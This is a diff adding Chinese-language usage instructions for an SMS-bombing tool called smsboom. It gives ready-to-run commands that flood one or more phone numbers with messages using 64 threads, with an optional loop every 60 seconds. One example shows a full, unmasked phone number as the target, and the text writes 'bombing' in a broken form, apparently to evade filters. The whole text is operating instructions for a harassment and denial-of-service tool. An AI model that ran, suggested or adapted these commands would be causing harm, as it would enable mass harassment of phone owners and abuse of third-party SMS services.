@@ -1,0 +1,24 @@
+
+smsboom_pyinstall.exe update
+
+启动64个线程,轰//炸一个人的手机号(198xxxxxxxx),只轰//炸一波。
+smsboom_pyinstall.exe run -t 64 -p 18734476545
+
+启动64个线程,轰//炸多个人的手机号(19xxxxxxx),启动循环轰//炸，每个循环间隔60秒
+smsboom_pyinstall.exe run -t 64 -p 198xxxxxxxxx -s -i 60
+
+启动64个线程,轰//炸多个人的手机号(138xxx,139xxxx),启动循环轰//炸,每个循环间隔60秒。
+smsboom_pyinstall.exe run -t 64 -p 138xxxxxxxx -p 139xxxxxxxx -s -i 60
+
+python smsboom.py run --help
+
+Usage: smsboom.py run [OPTIONS]
+
+传入线程数和手机号启动轰//炸,支持多手机号
+
+Options:
+-t, --thread INTEGER    线程数(默认64)
+-p, --phone TEXT        手机号,可传入多个再使用-p传递  [required]
+-s, --super             循环模式
+-i, --interval INTEGER  循环间隔时间(默认60s)
+--help                  Show this message and exit.
